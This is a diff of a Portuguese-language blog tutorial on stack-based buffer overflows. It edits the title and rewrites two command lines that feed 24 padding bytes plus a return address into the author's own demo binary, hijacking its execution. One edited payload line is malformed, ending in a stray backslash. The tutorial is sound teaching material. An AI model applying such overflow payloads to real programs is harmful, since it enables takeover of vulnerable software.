@@ -28,7 +28,7 @@
     </div>
   <div id="content">
     <div id="blog-archives">
-	    <h1><strong>Buffer Overflow (parte 1)</strong></h1>
+	    <h1><strong>Buffer Overflow (parte 0x01)</strong></h1>
       <h2>Stack Based Overflow</h2><br>
       <h3>Introdução</h3>
       <p>Então gente do bem, esse é um assunto muito conhecido pela maioria das pessoas que iniciam suas vidas no mundo de infosec e programming(mais frequentemente em C).<br>
@@ -407,18 +407,21 @@ Program received signal SIGSEGV, Segmentation fault.
 </code></blockquote></pre>
 
 <pre><blockquote><code>
-(gdb) run $(python -c 'print "A" * 24 + "\x66\x05\x40\x00\x00\x00\x00\x00"')
+(gdb) run $(python -c 'print "A" * 24 + "\x66\x05\x40\"')
 </code></blockquote></pre>
 
 <p>Parammmm! Vamos executar agora fora do GDB e ver como acontece</p>
 <p>Preste atenção na ordem que passamos cada byte, é inversa pois a arquitetura intel é little-endian! por isso quando olhavamos as dwords, os 4 bytes estavam na ordem inversa e quando a gente olhava como qword mostrava de forma "correta"</p>
 
 <pre><blockquote><code>
-➜  rev ./stackOverflow `python -c 'print "A" * 24 + "\x66\x05\x40\x00\x00\x00\x00\x00"'`
+➜  rev ./stackOverflow `python -c 'print "A" * 24 + "\x66\x05\x40"'`
 Execution Hijacked!
 [1]    9588 segmentation fault  ./stackOverflow 
 </code></blockquote></pre>
 
+O post 0x02 falaremos sobre heap overflow...
+
+That's all folks!
     <br><br>
       <strong>Done! Happy code!</strong>
     </div>
